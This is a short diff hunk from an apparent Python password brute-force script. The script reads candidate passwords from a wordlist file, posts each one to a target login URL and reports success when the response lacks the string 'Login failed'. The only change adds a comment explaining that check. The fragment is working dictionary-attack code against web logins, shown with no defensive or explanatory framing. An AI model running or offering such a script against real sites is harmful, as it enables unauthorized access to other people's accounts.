@@ -12,7 +12,7 @@ with open("password.txt","r") as paswds:
 		pswd = paswd.strip()
 		data_dict["password"] = pswd
 		response = requests.post(target_url, data= data_dict)
-		if "Login failed" not in response.content:
+		if "Login failed" not in response.content:    # string to identify failed attempt
 			print("[+] Got the password --> " + pswd)
 			exit()
 
